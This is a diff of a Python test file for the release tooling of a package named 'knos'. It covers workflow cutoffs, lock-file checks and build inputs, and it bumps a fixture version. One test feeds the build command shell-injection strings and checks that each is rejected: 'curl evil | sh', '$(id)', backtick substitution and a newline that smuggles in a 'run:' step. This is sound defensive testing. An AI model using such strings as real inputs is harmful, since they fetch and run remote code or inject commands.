@@ -13,7 +13,6 @@ import re
 import shutil
 import subprocess
 import sys
-from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 import pytest
@@ -560,7 +559,7 @@ def test_no_caller_can_change_which_code_judges():
         assert all("with" not in job for job in _doc(EXAMPLES / example)["jobs"].values()), example
 
 
-def test_the_release_the_workflows_install_is_this_one_and_its_cutoff_comes_after_it():
+def test_the_release_the_workflows_install_is_this_one():
     try:
         import tomllib
     except ModuleNotFoundError:   # Python 3.10
@@ -571,14 +570,8 @@ def test_the_release_the_workflows_install_is_this_one_and_its_cutoff_comes_afte
     # The workflows are written for the release being built and pyproject.toml moves at the release itself: until
     # then they may be ahead of it. They may never install an older release than the package's.
     assert as_numbers(release) >= as_numbers(version), f"the workflows install knos {release}; pyproject.toml is at {version}"
-    [cutoff] = set(re.findall(r'UV_EXCLUDE_NEWER: "([^"]+)"', "".join((WF / n).read_text(encoding="utf-8") for n in REUSABLE)))
-    cutoff = datetime.strptime(cutoff, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
-    newest, day = re.search(r"^## (\d+\.\d+\.\d+) \((\d{1,2} \w{3} \d{4})\)$", (ROOT / "CHANGELOG.md").read_text(encoding="utf-8"), re.M).groups()
-    released = datetime.strptime(day, "%d %b %Y").replace(tzinfo=timezone.utc)
-    # uv refuses every package published after the cutoff, knos itself included. So the cutoff must lie after the
-    # day the newest release in CHANGELOG.md was published: move UV_EXCLUDE_NEWER in fund.yml, prove.yml and check.yml
-    # to a day or two after the release, and publish the workflows again (scripts/pinned_workflows.py).
-    assert cutoff >= released + timedelta(days=1), f"UV_EXCLUDE_NEWER {cutoff:%Y-%m-%d} would refuse knos {newest}, released {day}"
+    # The cutoff after the upload of the release it names: tests/test_release_order.py
+    # (test_no_cutoff_in_this_tree_is_earlier_than_the_release_it_names).
 
 
 def test_no_job_of_the_payment_flow_restores_or_saves_a_cache():
@@ -1510,7 +1503,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.25 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.26 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1547,7 +1540,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.25 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.26 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
